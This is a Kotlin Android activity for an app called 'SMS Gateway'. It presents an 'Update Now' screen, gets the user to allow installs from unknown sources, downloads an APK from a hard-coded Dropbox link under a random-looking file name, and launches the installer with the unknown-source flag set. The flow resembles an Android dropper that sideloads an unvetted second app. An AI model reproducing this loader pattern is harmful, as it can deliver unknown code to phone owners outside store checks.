package com.earnbysms.smsgateway.presentation.activity

import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import android.content.Intent
import android.net.Uri
import android.content.pm.PackageManager
import android.provider.Settings
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import androidx.lifecycle.lifecycleScope
import com.earnbysms.smsgateway.presentation.ui.theme.SMSGatewayTheme
import java.io.File
import android.os.Environment
import android.webkit.MimeTypeMap
import android.app.DownloadManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import androidx.core.content.FileProvider
import android.os.Build
import java.io.FileInputStream

class InstallerMainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "InstallerMainActivity"
        private const val DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/okzat71pnxd9phhuganww/app-mainapp-release.apk?rlkey=02xchcqeh5v3xi2zcvklcvdus&st=am2zxju7&dl=1"
        private const val APK_FILE_NAME = "randmonhereman.apk"
        private const val REQUEST_CODE_INSTALL_PERMISSION = 1001
    }

    private var isDownloading = mutableStateOf(false)
    private var downloadProgress = mutableStateOf(0f)
    private var downloadedFile: File? = null
    private var isInstalling = mutableStateOf(false)
    private var installationCompleted = mutableStateOf(false)
    private var needsPermission = mutableStateOf(false)

    private val downloadReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val id = intent?.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1L) ?: -1L
            if (id == downloadId) {
                handleDownloadComplete()
            }
        }
    }

    private var downloadId: Long = -1L
    private var nextActionAfterPermission: String = "" // "download" or "install"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        checkInstallPermission()

        // Register download receiver
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(
                downloadReceiver,
                IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE),
                Context.RECEIVER_NOT_EXPORTED
            )
        } else {
            registerReceiver(
                downloadReceiver,
                IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
            )
        }

        setContent {
            SMSGatewayTheme {
                InstallerScreen()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(downloadReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
    }

    private fun checkInstallPermission() {
        needsPermission.value = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            !packageManager.canRequestPackageInstalls()
        } else {
            false
        }
        Log.d(TAG, "Install permission needed: ${needsPermission.value}")
    }

    private fun requestInstallPermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Log.d(TAG, "Requesting install permission for Android 8+")
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, REQUEST_CODE_INSTALL_PERMISSION)
            } else {
                Log.d(TAG, "No permission needed for Android < 8")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting install permission", e)
            val intent = Intent(Settings.ACTION_SECURITY_SETTINGS)
            startActivity(intent)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQUEST_CODE_INSTALL_PERMISSION -> {
                checkInstallPermission()
                if (!needsPermission.value) {
                    // Permission granted, execute the stored action
                    when (nextActionAfterPermission) {
                        "download" -> startDownload()
                        "install" -> proceedWithInstallation()
                        else -> Log.w(TAG, "No action specified after permission grant")
                    }
                    nextActionAfterPermission = "" // Reset action
                } else {
                    Log.w(TAG, "Install permission still not granted")
                }
            }
        }
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    private fun InstallerScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            // Simple Update Button
            UpdateButton()
        }
    }

    @Composable
    private fun UpdateButton() {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Icon(
                    imageVector = if (isDownloading.value) Icons.Default.Settings else Icons.Default.Info,
                    contentDescription = "Download",
                    modifier = Modifier.size(48.dp),
                    tint = MaterialTheme.colorScheme.primary
                )

                Text(
                    text = "SMS Gateway",
                    style = MaterialTheme.typography.headlineMedium,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )

                when {
                    needsPermission.value -> {
                        Text(
                            text = "Permission Required",
                            style = MaterialTheme.typography.bodyLarge,
                            color = MaterialTheme.colorScheme.error,
                            textAlign = TextAlign.Center
                        )

                        Text(
                            text = "Please allow installation from unknown sources",
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                            textAlign = TextAlign.Center
                        )

                        Button(
                            onClick = { requestInstallPermission() },
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Icon(
                                imageVector = Icons.Default.Settings,
                                contentDescription = null,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Enable Permission")
                        }
                    }

                    isDownloading.value -> {
                        Text(
                            text = "Downloading... ${downloadProgress.value.toInt()}%",
                            style = MaterialTheme.typography.bodyLarge,
                            color = MaterialTheme.colorScheme.primary,
                            textAlign = TextAlign.Center
                        )

                        LinearProgressIndicator(
                            progress = downloadProgress.value / 100f,
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(8.dp)
                        )
                    }

                    isInstalling.value -> {
                        Text(
                            text = "Installing...",
                            style = MaterialTheme.typography.bodyLarge,
                            color = MaterialTheme.colorScheme.primary,
                            textAlign = TextAlign.Center
                        )

                        LinearProgressIndicator(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(8.dp)
                        )
                    }

                    installationCompleted.value -> {
                        Text(
                            text = "Installation Complete!",
                            style = MaterialTheme.typography.bodyLarge,
                            color = MaterialTheme.colorScheme.primary,
                            textAlign = TextAlign.Center
                        )

                        Text(
                            text = "Main app has been installed successfully",
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                            textAlign = TextAlign.Center
                        )
                    }

                    else -> {
                        Text(
                            text = "Update Available",
                            style = MaterialTheme.typography.bodyLarge,
                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                            textAlign = TextAlign.Center
                        )

                        Button(
                            onClick = {
                                if (needsPermission.value) {
                                    nextActionAfterPermission = "download"
                                    requestInstallPermission()
                                } else {
                                    startDownload()
                                }
                            },
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Icon(
                                imageVector = Icons.Default.Settings,
                                contentDescription = null,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Update Now")
                        }
                    }
                }
            }
        }
    }

    private fun startDownload() {
        // Check installation permission first for Android 8+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                Log.w(TAG, "Cannot download - install permission not granted")
                needsPermission.value = true
                android.widget.Toast.makeText(
                    this,
                    "Please enable permission to install unknown apps first",
                    android.widget.Toast.LENGTH_LONG
                ).show()
                return
            }
        }

        proceedWithDownload()
    }

    private fun proceedWithDownload() {
        try {
            Log.d(TAG, "Starting download of main app APK")

            val downloadManager = getSystemService(DOWNLOAD_SERVICE) as DownloadManager
            val request = DownloadManager.Request(Uri.parse(DOWNLOAD_URL))
                .setTitle("SMS Gateway Update")
                .setDescription("Downloading latest version of SMS Gateway")
                .setMimeType("application/vnd.android.package-archive")
                .setDestinationInExternalPublicDir(
                    Environment.DIRECTORY_DOWNLOADS,
                    APK_FILE_NAME
                )
                .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)

            downloadId = downloadManager.enqueue(request)
            isDownloading.value = true
            downloadProgress.value = 0f

            lifecycleScope.launch {
                monitorDownloadProgress()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error starting download", e)
            isDownloading.value = false
            android.widget.Toast.makeText(
                this,
                "Download failed: ${e.message}",
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }

    private suspend fun monitorDownloadProgress() {
        val downloadManager = getSystemService(DOWNLOAD_SERVICE) as DownloadManager
        var downloading = true

        while (downloading && isDownloading.value) {
            val query = DownloadManager.Query().setFilterById(downloadId)
            val cursor = downloadManager.query(query)

            cursor?.use {
                if (it.moveToFirst()) {
                    val bytesDownloaded = it.getLong(it.getColumnIndexOrThrow(DownloadManager.COLUMN_BYTES_DOWNLOADED_SO_FAR))
                    val bytesTotal = it.getLong(it.getColumnIndexOrThrow(DownloadManager.COLUMN_TOTAL_SIZE_BYTES))
                    val status = it.getInt(it.getColumnIndexOrThrow(DownloadManager.COLUMN_STATUS))

                    if (bytesTotal > 0) {
                        val progress = ((bytesDownloaded * 100f) / bytesTotal)
                        downloadProgress.value = progress.coerceIn(0f, 100f)
                    }

                    if (status == DownloadManager.STATUS_SUCCESSFUL) {
                        downloading = false
                        // Handle successful download completion
                        handleDownloadComplete()
                    } else if (status == DownloadManager.STATUS_FAILED) {
                        downloading = false
                        Log.e(TAG, "Download failed")
                        isDownloading.value = false
                    }
                }
            }

            delay(500)
        }
    }

    private fun handleDownloadComplete() {
        try {
            Log.d(TAG, "Download completed, processing...")

            val downloadManager = getSystemService(DOWNLOAD_SERVICE) as DownloadManager
            val query = DownloadManager.Query().setFilterById(downloadId)
            val cursor = downloadManager.query(query)

            cursor?.use {
                if (it.moveToFirst()) {
                    val statusIndex = it.getColumnIndex(DownloadManager.COLUMN_STATUS)
                    val status = if (statusIndex >= 0) it.getInt(statusIndex) else -1

                    if (status == DownloadManager.STATUS_SUCCESSFUL) {
                        // Get the file from the Downloads directory
                        val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                        downloadedFile = File(downloadsDir, APK_FILE_NAME)

                        Log.d(TAG, "Downloaded file path: ${downloadedFile?.absolutePath}")
                        Log.d(TAG, "File exists: ${downloadedFile?.exists()}")
                        Log.d(TAG, "File size: ${downloadedFile?.length()} bytes")

                        if (downloadedFile?.exists() == true && downloadedFile?.length()!! > 1000000) {
                            isDownloading.value = false
                            downloadProgress.value = 100f

                            android.widget.Toast.makeText(
                                this,
                                "Download completed! Starting installation...",
                                android.widget.Toast.LENGTH_SHORT
                            ).show()

                            lifecycleScope.launch {
                                delay(500)
                                installApp()
                            }
                        } else {
                            Log.e(TAG, "Downloaded file is invalid or too small")
                            isDownloading.value = false
                            android.widget.Toast.makeText(
                                this,
                                "Downloaded file is invalid. Please try again.",
                                android.widget.Toast.LENGTH_LONG
                            ).show()
                        }
                    } else {
                        val reasonIndex = it.getColumnIndex(DownloadManager.COLUMN_REASON)
                        val reason = if (reasonIndex >= 0) it.getInt(reasonIndex) else -1
                        Log.e(TAG, "Download failed with status: $status, reason: $reason")
                        isDownloading.value = false
                        android.widget.Toast.makeText(
                            this,
                            "Download failed. Please check your internet connection.",
                            android.widget.Toast.LENGTH_LONG
                        ).show()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling download complete", e)
            isDownloading.value = false
            android.widget.Toast.makeText(
                this,
                "Error processing download: ${e.message}",
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }

    private fun installApp() {
        // Check install permission before attempting installation
        if (needsPermission.value) {
            nextActionAfterPermission = "install"
            requestInstallPermission()
        } else {
            proceedWithInstallation()
        }
    }

    private fun proceedWithInstallation() {
        try {
            Log.d(TAG, "Starting APK installation from: ${downloadedFile?.absolutePath}")
            isInstalling.value = true

            val file = downloadedFile
            if (file == null || !file.exists()) {
                Log.e(TAG, "APK file not found at: ${file?.absolutePath}")
                isInstalling.value = false
                android.widget.Toast.makeText(
                    this,
                    "APK file not found. Please download again.",
                    android.widget.Toast.LENGTH_LONG
                ).show()
                return
            }

            Log.d(TAG, "Android SDK: ${Build.VERSION.SDK_INT}, File: ${file.absolutePath}, Size: ${file.length()}")

            // Check if file exists and is readable
            if (!file.exists()) {
                Log.e(TAG, "Downloaded file does not exist: ${file.absolutePath}")
                isInstalling.value = false
                android.widget.Toast.makeText(
                    this,
                    "Downloaded file not found. Please try again.",
                    android.widget.Toast.LENGTH_LONG
                ).show()
                return
            }

            // Validate file size
            if (file.length() < 100000) {
                Log.e(TAG, "Invalid APK file size: ${file.length()} bytes - file is too small for a valid APK")

                // Read first few bytes to check if it's HTML instead of APK
                try {
                    val fis = FileInputStream(file)
                    val header = ByteArray(100)
                    val bytesRead = fis.read(header)
                    fis.close()

                    val headerString = String(header, 0, bytesRead, Charsets.UTF_8)
                    Log.e(TAG, "File header: $headerString")

                    if (headerString.contains("<html") || headerString.contains("<!DOCTYPE")) {
                        Log.e(TAG, "Downloaded file is HTML, not APK - URL redirection issue")
                        android.widget.Toast.makeText(
                            this,
                            "Download error: Got HTML instead of APK file",
                            android.widget.Toast.LENGTH_LONG
                        ).show()
                    } else {
                        android.widget.Toast.makeText(
                            this,
                            "Invalid APK file size: ${file.length()} bytes. Please download again.",
                            android.widget.Toast.LENGTH_LONG
                        ).show()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to read file header: ${e.message}")
                }

                isInstalling.value = false
                return
            }

            // Validate APK file signature
            try {
                val fis = FileInputStream(file)
                val apkHeader = ByteArray(4)
                fis.read(apkHeader)
                fis.close()

                // APK files start with PK (ZIP format)
                if (apkHeader[0] != 0x50.toByte() || apkHeader[1] != 0x4B.toByte()) {
                    Log.e(TAG, "Invalid APK file signature: ${apkHeader.contentToString()}")
                    android.widget.Toast.makeText(
                        this,
                        "Invalid APK file format. File may be corrupted.",
                        android.widget.Toast.LENGTH_LONG
                    ).show()
                    isInstalling.value = false
                    return
                }
                Log.d(TAG, "APK file signature validated successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to validate APK signature: ${e.message}")
            }

            // Check installation permission for Android 8+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!packageManager.canRequestPackageInstalls()) {
                    Log.e(TAG, "No installation permission")
                    isInstalling.value = false
                    needsPermission.value = true
                    android.widget.Toast.makeText(
                        this,
                        "Please enable installation from unknown sources",
                        android.widget.Toast.LENGTH_LONG
                    ).show()
                    return
                }
            }

            // Create intent based on Android version
            val intent: Intent

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Android 7.0+ (API 24+) - Must use FileProvider
                Log.d(TAG, "Using FileProvider for Android 7+")

                val contentUri = try {
                    FileProvider.getUriForFile(
                        this,
                        "${packageName}.fileprovider",
                        file
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to create FileProvider URI: ${e.message}", e)
                    isInstalling.value = false
                    android.widget.Toast.makeText(
                        this,
                        "Failed to prepare installation. Error: ${e.message}",
                        android.widget.Toast.LENGTH_LONG
                    ).show()
                    return
                }

                Log.d(TAG, "FileProvider URI: $contentUri")

                // Use ACTION_INSTALL_PACKAGE for Android 7+
                intent = Intent(Intent.ACTION_INSTALL_PACKAGE).apply {
                    setDataAndType(contentUri, "application/vnd.android.package-archive")
                    flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
                    putExtra(Intent.EXTRA_RETURN_RESULT, true)
                }
            } else {
                // Android 6.0 and below - Use file:// URI
                Log.d(TAG, "Using file:// URI for Android < 7")

                val apkUri = Uri.fromFile(file)
                intent = Intent(Intent.ACTION_VIEW).apply {
                    setDataAndType(apkUri, "application/vnd.android.package-archive")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            }

            // Log intent details
            Log.d(TAG, "Install Intent Action: ${intent.action}")
            Log.d(TAG, "Install Intent Data: ${intent.data}")
            Log.d(TAG, "Install Intent Type: ${intent.type}")

            // Verify that an activity can handle this intent
            val resolveInfo = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)

            if (resolveInfo == null) {
                Log.e(TAG, "No activity found to handle installation intent")
                isInstalling.value = false
                android.widget.Toast.makeText(
                    this,
                    "Cannot find installer. Please install manually.",
                    android.widget.Toast.LENGTH_LONG
                ).show()
                return
            }

            Log.d(TAG, "Installation will be handled by: ${resolveInfo.activityInfo.packageName}")

            // Start installation
            try {
                startActivity(intent)
                Log.d(TAG, "✅ Installation activity started successfully")

                android.widget.Toast.makeText(
                    this,
                    "Opening installer. Please follow the prompts.",
                    android.widget.Toast.LENGTH_LONG
                ).show()

                lifecycleScope.launch {
                    delay(2000)
                    isInstalling.value = false
                }

            } catch (e: Exception) {
                Log.e(TAG, "Failed to start installation: ${e.message}", e)
                isInstalling.value = false
                android.widget.Toast.makeText(
                    this,
                    "Failed to start installation: ${e.message}",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Installation failed", e)
            isInstalling.value = false
            android.widget.Toast.makeText(
                this,
                "Installation error: ${e.message}",
                android.widget.Toast.LENGTH_LONG
            ).show()
        }
    }
}